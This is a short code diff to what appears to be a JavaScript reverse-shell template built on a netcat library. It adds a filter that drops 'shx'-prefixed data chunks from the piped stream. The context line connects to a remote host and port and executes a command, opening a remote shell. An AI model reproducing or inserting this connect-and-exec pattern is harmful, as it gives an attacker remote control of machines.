@@ -10,11 +10,17 @@ var RETRY = {{retry}}
 
 nc.addr(RHOST).port(RPORT).retry(RETRY).connect().exec(cmd)
 
-nc.on('data', function(data){
-  // TODO: piped and captured too?
+nc.filter(function (chunk, enc, next) {
+  if (chunk.toString().indexOf('shx') === 0){
+    // filter it on pipe
+    next(null)
+  } else {
+    next(null, chunk)
+  }
+}).on('data', function(data){
+  // the filter doesn't apply on 'data' events, just on the pipe stream.
   if (data.toString().indexOf('shx') === 0){
     console.log('Cross-platform command!')
+    // TODO...
   }
 })
-
-// TODO: implement pipe "filter" on netcat.. through2...
